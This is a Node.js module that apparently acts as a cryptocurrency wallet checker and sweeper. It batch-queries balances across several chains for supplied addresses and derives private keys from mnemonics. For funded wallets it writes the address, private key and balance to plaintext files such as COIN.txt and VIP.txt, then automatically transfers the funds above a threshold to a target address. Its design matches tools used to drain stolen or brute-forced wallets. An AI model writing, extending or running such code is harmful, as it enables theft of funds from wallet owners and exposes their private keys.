const fs = require('fs/promises');
const path = require('path');
const HdKeyring = require('@metamask/eth-hd-keyring');
const { BALANCE_CHECKER_ABI } = require('../config/abi');
const { TOKEN_ADDRESSES, CHAIN_CONFIG, SCAN_DEFAULTS } = require('../config/constants');
const { getWeb3 } = require('../utils/web3Pool');
const SendCoinManager = require('./sendCoin.service');
const logger = require('../utils/logger');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Run balance check across multiple chains and tokens
 */
async function run(apiKey, addresses, tokens, chains, targetAddress) {
  for (const chainName of chains) {
    const chainConfig = CHAIN_CONFIG[chainName];
    if (!chainConfig) {
      logger.warn({ chainName }, 'Unknown chain, skipping');
      continue;
    }

    try {
      const web3 = getWeb3(chainConfig.key, apiKey);
      const tokenAddresses = TOKEN_ADDRESSES[chainConfig.key];
      const contractAddress = chainConfig.balanceCheckerAddress;
      const contract = new web3.eth.Contract(BALANCE_CHECKER_ABI, contractAddress, {
        from: contractAddress
      });

      // Check each token separately (matching reference logic)
      for (const token of tokens) {
        const tokenAddr = tokenAddresses[token];
        // tokenAddress array with single token for contract call
        const tokenAddressArray = [
          (!tokenAddr || token === 'NATIVE')
            ? '0x0000000000000000000000000000000000000000'
            : tokenAddr
        ];

        await check({
          name: chainName,
          arr: addresses,
          maxPerTime: chainConfig.batchSize,
          web3,
          contract,
          explorerUrl: chainConfig.explorerUrl,
          coin: token,
          tokenAddress: tokenAddressArray,
          targetAddress,
          gasLimit: chainConfig.gasLimit,
          chainConfig
        });
      }
    } catch (error) {
      logger.error({ chainName, err: error }, 'Error processing chain');
    }
  }
  return addresses;
}

/**
 * Check balances - one token at a time, matching reference logic exactly
 * data[i] maps directly to addressArray[i]
 */
async function check({ name, arr, maxPerTime, web3, contract, explorerUrl, coin, tokenAddress, targetAddress, gasLimit, chainConfig }) {
  if (!gasLimit) {
    gasLimit = 21000n;
  }

  try {
    let gasPrice = null;
    let arrA = arr.map((e) => e.address);

    while (arrA.length !== 0) {
      const arr2 = arrA.splice(0, maxPerTime);
      try {
        const data = await contract.methods.balances(arr2, tokenAddress).call();

        let textTemp = '';
        let textTemp2 = '';

        for (const [i, value] of data.entries()) {
          const address = arr2[i];
          const item = arr.find((e) => e.address === address);

          // Always push balance info (including zero)
          if (item) {
            const amount = web3.utils.fromWei(value, 'ether');
            item.balances.push({
              chain: name,
              token: coin,
              balance: amount // keep full precision from fromWei
            });

            if (value !== '0' && value !== 0n) {
              // Export private key for mnemonic wallets
              if (!item.privateKey && item.mnemonic) {
                const keyring = new HdKeyring({
                  mnemonic: item.mnemonic,
                  numberOfAccounts: 5,
                });
                item.privateKey = await keyring.exportAccount(address);
              }

              const text = `${explorerUrl}/address/${address} : ${item.privateKey} : ${amount} ${coin}`;
              const text2 = `${address}:${item.privateKey}`;
              textTemp += text + '\n';
              textTemp2 += text2 + '\n';

              if (targetAddress && parseFloat(amount) > SCAN_DEFAULTS.balanceThreshold) {
                if (!gasPrice) {
                  gasPrice = chainConfig.fixedGasPrice || await web3.eth.getGasPrice();
                  logger.info({ name, gasPrice: gasPrice.toString(), gasLimit: gasLimit.toString() }, 'Gas info');
                }

                const fee = BigInt(gasPrice) * BigInt(gasLimit);
                if (BigInt(value) > fee) {
                  try {
                    const manager = new SendCoinManager(web3);
                    const txHash = await manager.sendWithGas(
                      item.privateKey,
                      targetAddress,
                      gasPrice,
                      gasLimit
                    );
                    if (txHash) {
                      item.balances[item.balances.length - 1].txHash = txHash;
                      logger.info({ address, txHash, amount }, 'Funds swept');
                    }
                  } catch (err) {
                    logger.error({ address, err }, 'Sweep error');
                  }
                  await fs.appendFile(path.join(process.cwd(), 'VIP.txt'), `${text}\n`);
                  await sleep(1000);
                }
              }
            }
          }
        }

        if (textTemp) await fs.appendFile(path.join(process.cwd(), 'COIN.txt'), textTemp);
        if (textTemp2) await fs.appendFile(path.join(process.cwd(), 'address-coin.txt'), textTemp2);
      } catch (error) {
        logger.error({ name, err: error }, 'Error checking balances batch');
      }
      await sleep(500);
    }
  } catch (error) {
    logger.error({ name, err: error }, 'Error in check');
    return false;
  }
  return true;
}

module.exports = { run };
